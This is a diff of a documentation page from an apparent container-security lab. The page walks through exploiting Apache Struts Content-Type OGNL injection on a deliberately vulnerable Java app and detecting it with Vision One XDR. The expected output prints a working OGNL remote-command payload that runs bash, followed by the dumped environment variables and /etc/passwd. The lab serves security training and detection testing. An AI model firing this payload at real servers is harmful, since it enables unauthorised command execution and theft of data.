@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../xdr-for-containers-ecs-log4j/">
+        <link rel="prev" href="../container-security-eks-dind-exploitation/">
       
       
-        <link rel="next" href="../container-security-eks-escape/">
+        <link rel="next" href="../container-security-eks-runtime-vulnerability/">
       
       <link rel="icon" href="../../images/playground-icon.png">
       <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.1.21">
@@ -469,16 +469,14 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" checked>
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
       
       
       
@@ -487,7 +485,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="true">
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
         <label class="md-nav__title" for="__nav_5_1">
           <span class="md-nav__icon md-icon"></span>
           XDR for Containers
@@ -516,6 +514,84 @@
     <li class="md-nav__item">
       <a href="../xdr-for-containers-ecs-log4j/" class="md-nav__link">
         JNDI Injection in HTTP Request
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xdr-for-containers-ecs-struts/" class="md-nav__link">
+        Apache Struts Multipart Encoding Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+          Container Security
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_5_2">
+          <span class="md-nav__icon md-icon"></span>
+          Container Security
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../container-security-eks-escape/" class="md-nav__link">
+        Escape to Host System
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../container-security-eks-dind-exploitation/" class="md-nav__link">
+        ContainerD Abuse
       </a>
     </li>
   
@@ -599,82 +675,6 @@
   
 </nav>
       
-    </li>
-  
-
-            
-          
-        </ul>
-      </nav>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-      
-      
-      
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
-      
-      
-      
-        <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
-          Container Security
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
-        <label class="md-nav__title" for="__nav_5_2">
-          <span class="md-nav__icon md-icon"></span>
-          Container Security
-        </label>
-        <ul class="md-nav__list" data-md-scrollfix>
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../container-security-eks-escape/" class="md-nav__link">
-        Escape to Host System
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../container-security-eks-dind-exploitation/" class="md-nav__link">
-        ContainerD Abuse
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../xdr-for-containers-eks-struts/" class="md-nav__link">
-        Apache Struts Multipart Encoding Command Injection
-      </a>
     </li>
   
 
@@ -954,7 +954,8 @@
 <h2 id="prerequisites">Prerequisites<a class="headerlink" href="#prerequisites" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Vision One XDR for Containers linked with Playground One VPC</li>
-<li>Playground One ECS Cluster (Any variant)</li>
+<li>Playground One EKS Cluster</li>
+<li>Playground One Scenarios</li>
 <li>Running app: Java-Goof running on vulnerable Tomcat</li>
 <li>Extracted contents of <code>exploit.zip</code></li>
 </ul>
@@ -971,52 +972,79 @@
 </blockquote>
 <h2 id="exploiting">Exploiting<a class="headerlink" href="#exploiting" title="Permanent link">&para;</a></h2>
 <p>First, retrieve the load balancer DNS name</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pgo<span class="w"> </span>-o<span class="w"> </span>ecs
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pgo<span class="w"> </span>-o<span class="w"> </span>scenarios
 </code></pre></div>
 <p>Example output with ECS EC2:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">cluster_name_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2&quot;</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">loadbalancer_dns_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">loadbalancer_dns_health_check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;k8s-goat-healthch-e9104c52db-803985454.eu-central-1.elb.amazonaws.com&quot;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">loadbalancer_dns_hunger_check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;k8s-goat-hungerch-0816ee11b2-1006982801.eu-central-1.elb.amazonaws.com&quot;</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nv">loadbalancer_dns_java_goof</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com&quot;</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nv">loadbalancer_dns_openssl3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;k8s-victims-webappin-8cd6b2fc5e-1459691118.eu-central-1.elb.amazonaws.com&quot;</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nv">loadbalancer_dns_system_monitor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;k8s-goat-systemmo-09a16052b6-565756108.eu-central-1.elb.amazonaws.com&quot;</span>
 </code></pre></div>
-<p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>
+<p>You want the variable <code>loadbalancer_dns_java_goof</code>.</p>
 <h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
 <p>Run:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">cd</span><span class="w"> </span><span class="si">${</span><span class="nv">ONEPATH</span><span class="si">}</span>/exploits/struts/
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>./struts-exploit.sh<span class="w"> </span>playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>./struts-exploit.sh<span class="w"> </span>k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com
 </code></pre></div>
 <p>Expexted result:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>*   Trying 18.195.245.32:80...
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&gt; GET /todolist/todolist/ HTTP/1.1
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>*   Trying 3.120.84.56:80...
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>* Connected to k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com (3.120.84.56) port 80 (#0)
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&gt; GET /todolist/ HTTP/1.1
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&gt; Host: k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com
 <a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>&gt; User-Agent: curl/7.81.0
 <a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>&gt; Accept: */*
 <a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>&gt; Content-type: %{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;env&#39;).(#cmds={&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 <a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>&gt; 
 <a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>* Mark bundle as not supporting multiuse
-<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>&lt; HTTP/1.1 200 
-<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>&lt; HTTP/1.1 200 OK
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT
 <a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>&lt; Transfer-Encoding: chunked
 <a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>&lt; Connection: keep-alive
-<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>&lt; 
-<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib
-<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5
-<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>CATALINA_HOME=/usr/local/tomcat
-<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>LANG=C.UTF-8
-<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>HOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal
-<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>...
-<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>_apt:x:100:65534::/nonexistent:/bin/false
-<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>messagebus:x:101:101::/var/run/dbus:/bin/false
-<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>* transfer closed with outstanding read data remaining
-<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>* Closing connection 0
-<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>curl: (18) transfer closed with outstanding read data remaining
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>&lt; Server: Apache-Coyote/1.1
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>&lt; 
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>WEB_APP_SERVICE_SERVICE_PORT=80
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>KUBERNETES_SERVICE_PORT_HTTPS=443
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>TREND_AP_LOG_FILE=STDERR
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>JAVA_GOOF_SERVICE_SERVICE_PORT=8080
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>KUBERNETES_SERVICE_PORT=443
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>WEB_APP_SERVICE_PORT_80_TCP_ADDR=172.20.245.34
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>MAVEN_CONFIG=/root/.m2
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>MAVEN_PROJECTBASEDIR=/usr/src/goof
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>HOSTNAME=java-goof-6c95b8cd5f-qn49h
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>MAVEN_CMD_LINE_ARGS=/root/.m2 tomcat7:run
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>JAVA_GOOF_SERVICE_PORT_8080_TCP_PORT=8080
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>...
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>* Mark bundle as not supporting multiuse
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>&lt; HTTP/1.1 200 OK
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>&lt; Transfer-Encoding: chunked
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>&lt; Connection: keep-alive
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>&lt; Server: Apache-Coyote/1.1
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>&lt; 
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>root:x:0:0:root:/root:/bin/bash
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>sync:x:4:65534:sync:/bin:/bin/sync
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+<a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+<a id="__codelineno-5-43" name="__codelineno-5-43" href="#__codelineno-5-43"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+<a id="__codelineno-5-44" name="__codelineno-5-44" href="#__codelineno-5-44"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+<a id="__codelineno-5-45" name="__codelineno-5-45" href="#__codelineno-5-45"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+<a id="__codelineno-5-46" name="__codelineno-5-46" href="#__codelineno-5-46"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+<a id="__codelineno-5-47" name="__codelineno-5-47" href="#__codelineno-5-47"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<a id="__codelineno-5-48" name="__codelineno-5-48" href="#__codelineno-5-48"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+<a id="__codelineno-5-49" name="__codelineno-5-49" href="#__codelineno-5-49"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+<a id="__codelineno-5-50" name="__codelineno-5-50" href="#__codelineno-5-50"></a>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+<a id="__codelineno-5-51" name="__codelineno-5-51" href="#__codelineno-5-51"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+<a id="__codelineno-5-52" name="__codelineno-5-52" href="#__codelineno-5-52"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+<a id="__codelineno-5-53" name="__codelineno-5-53" href="#__codelineno-5-53"></a>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+<a id="__codelineno-5-54" name="__codelineno-5-54" href="#__codelineno-5-54"></a>* Connection #0 to host k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com left intact
 </code></pre></div>
 <p>Vision One Observed Attack Techniques:</p>
-<p><img alt="alt text" src="../images/xdr_for_containers-ecs-struts-01.png" title="Exploit" /></p>
+<p><img alt="alt text" src="../images/xdr_for_containers-eks-struts-01.png" title="Exploit" /></p>
 
 
 
